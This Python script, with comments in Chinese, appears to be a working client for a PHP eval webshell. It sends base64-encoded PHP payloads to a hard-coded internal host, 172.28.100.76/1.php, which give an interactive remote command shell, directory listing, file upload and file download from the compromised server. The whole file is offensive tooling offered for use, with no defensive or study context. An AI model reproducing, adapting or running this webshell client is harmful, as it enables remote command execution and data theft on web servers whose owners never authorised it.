#! /usr/bin/env python
#! -*-coding:utf-8 -*-

'''
    注意 路径必须用.replace('\\', '\\\\')转换线
'''
import logging
import subprocess
import re,os,sys
import requests
import base64
import urllib3
from cmd import Cmd
from urllib import request
from urllib.parse import urlencode,quote_plus

logging.getLogger("urllib3").setLevel(logging.WARNING)

prompt = "root@python># "
lujing=[]
url = 'http://172.28.100.76/1.php'


# requests方法
def post(url, data):
    header = {'User-Agent':'Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN;'
    'rv:1.8.1.14) Gecko/20080404 (FoxPlus) Firefox/2.0.0.14'}
    req = requests.post(url, data=data, headers=header)
    return req.content
# 提交POST请求
def oldpost(url, data):
	headers = {'User_Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'}
	response = request.Request(url, data, headers=headers)
	html = request.urlopen(response).read()
	try:
		data = html.decode(encoding='utf-8')
	except Exception as e:
		data = html.decode()
	return data

# 匹配路径
def RegexFindPath(r,data):
	data = re.findall(r,data)
	data = ''.join(data)
	print ('匹配路径:{}'.format(data))
	data = "C:" + data
	return data

# 获取当前路径
def GetCurrentPath():
	headers = {'User_Agent':'Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6'}

	code = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B \
	&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtA \
	c2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOztlY2hvIGRpcm5hbW \
	UoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTs7ZWNobygifDwtIik7ZGllKCk7'
	
	response = request.Request(url, code, headers=headers)
	html = request.urlopen(response).read()
	data = html.decode()
	# print (data)
	# 匹配路径
	data = RegexFindPath(r'C:(.*?)\|',data)

	data = ''.join(data)
	
	lujing.append(data)

	# leng = len(lujing)
	# /phpStudy/WWW 替换为\
	lujing[0] = lujing[0].replace('/',"\\")
	return lujing[0].strip()

# 执行shell脚本
def DoShell():
	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt\
	Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2R\
	lKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJ\
	F9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcIns\
	kc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJld\
	Ck7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D'
	z1 = b'&z1=Y21k'
	current_path = GetCurrentPath()
	print ('完整路径:{}'.format(current_path))
	while True:
		NowPath = current_path[:]
		print ('你是谁:{0}'.format(NowPath))
		NowPath = ''.join(NowPath).strip()
		print ('新路径:{}'.format(NowPath))
		cmd = input(NowPath + '>')
		cmd = cmd.strip()

		if cmd == 'q':break

		cmd1 = 'cd /d "{0}"&{1}&echo [S]&cd&echo [E]'.format(NowPath+'\\',cmd)
		print (cmd1)
		# Python以后发送出去的数据必须是bytes的
		cmd2 = base64.b64encode(bytes(cmd1, encoding='utf8'))

		z2 = b'&z2=' + cmd2
		print (z2)
		post_data = shellpass + z0 + z1 + z2
		response = oldpost(url,post_data)
		# 匹配cd命令
		pattern = re.compile('^cd')
		result = pattern.findall(cmd)

		if result:
			data=RegexFindPath(r'C:(.*?)\n',response)

			current_path= []
			current_path.append(data)
			current_path = ''.join(current_path)
			print ('切换的路径: {}'.format(current_path[:]))
		else:        
			print (response)
# 查看文件
def ShowFile():
	# url = raw_input('Pls input url:')
	url = 'http://172.28.100.76/1.php'
	# sitepath = raw_input('Pls input sitepath:')
	sitepath = 'c:\\'
	# shellpass只需要url编码
	# 函数名不URL编码也不base64编码
	# php代码需要base64编码
	code = b'''shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&z0=QGl
	uaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1
	b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk
	7JEY9QG9wZW5kaXIoJEQpO2lmKCRGPT1OVUxMKXtlY2hvKCJFUlJPUjovLyBQYXRoIE5vdCBGb3VuZCBP
	ciBObyBQZXJtaXNzaW9uISIpO31lbHNleyRNPU5VTEw7JEw9TlVMTDt3aGlsZSgkTj1AcmVhZGRpcigkR
	ikpeyRQPSRELiIvIi4kTjskVD1AZGF0ZSgiWS1tLWQgSDppOnMiLEBmaWxlbXRpbWUoJFApKTtAJEU9c3
	Vic3RyKGJhc2VfY29udmVydChAZmlsZXBlcm1zKCRQKSwxMCw4KSwtNCk7JFI9Ilx0Ii4kVC4iXHQiLkB
	maWxlc2l6ZSgkUCkuIlx0Ii4kRS4iCiI7aWYoQGlzX2RpcigkUCkpJE0uPSROLiIvIi4kUjtlbHNlICRM
	Lj0kTi4kUjt9ZWNobyAkTS4kTDtAY2xvc2VkaXIoJEYpO307ZWNobygifDwtIik7ZGllKCk7&z1='''
	# 拼接数据
	phpcode = code + base64.b64encode(bytes(sitepath, encoding='utf8'))
	order = oldpost(url, phpcode)
	print (order)
	if order == '-|ERROR:// Path Not Found Or No Permission!|<-':
		print ("Error: Path Not Found Or No Permission!")
		return False
	else:
		print("website path: " + sitepath)
# 上传文件
def UploadFile():
	print (r'例如：c:\phpStudy\WWW\\')
	upload_file_path = input(r'Please input path: ')
	
	uploadfile = input('Please upload file: ')
	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTt\
	Ac2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskZj1iYXNlNjRfZGVjb2R\
	lKCRfUE9TVFsiejEiXSk7JGM9JF9QT1NUWyJ6MiJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpO\
	yRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTs\
	kaSs9MikkYnVmLj11cmxkZWNvZGUoIiIuc3Vic3RyKCRjLCRpLDIpKTtlY2hvKEBmd3JpdGUoZm9wZ\
	W4oJGYsInciKSwkYnVmKT8iMSI6IjAiKTs7ZWNobygifDwtIik7ZGllKCk7'

	z1 = '{0}{1}'.format(upload_file_path,uploadfile)
	print (z1)
	z1 = b'&z1=' + base64.b64encode(bytes(z1,encoding='utf8'))
	print (z1)
	with open(uploadfile,'rb') as f:
		z2 = b'&z2=' + (bytes(f.read()))
	post_data = shellpass + z0 + z1 + z2
	response = oldpost(url,post_data)

def DownloadFeile():
	print (r'例如：c:\phpStudy\WWW\\')
	# download_file_path = input(r'Please input path: ')
	download_file_path = r'c:\phpStudy\WWW\\'
	downloadfile = input('Please upload file: ')
	shellpass = b'shellpass=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B'
	z0 = b'&z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1nZXRfbWFnaWNfcXVvdGVzX2dwYygpP3N0cmlwc2xhc2hlcygkX1BPU1RbInoxIl0pOiRfUE9TVFsiejEiXTskZnA9QGZvcGVuKCRGLCJyIik7aWYoQGZnZXRjKCRmcCkpe0BmY2xvc2UoJGZwKTtAcmVhZGZpbGUoJEYpO31lbHNle2VjaG8oIkVSUk9SOi8vIENhbiBOb3QgUmVhZCIpO307ZWNobygifDwtIik7ZGllKCk7'
	z1 = '{0}{1}'.format(download_file_path,downloadfile)
	print (z1)
	z1 = b'&z1=' + bytes(z1,encoding='utf8')
	print (z1)
	post_data = shellpass + z0 + z1
	response = oldpost(url,post_data)
	# print (response)
	with open(downloadfile,'a+') as f:
		f.write(response)

def DeleteFile():
	pass

def ShowDB():

	pass

if __name__ == '__main__':
	op = input('''Please select a number
1: 虚拟终端
2: 文件管理
3: 数据库管理
: ''')
	if op == '1':
		DoShell()
	elif op == '2':
		# UploadFile()
		DownloadFeile()
		# DeleteFile()
	elif op == '3':
		pass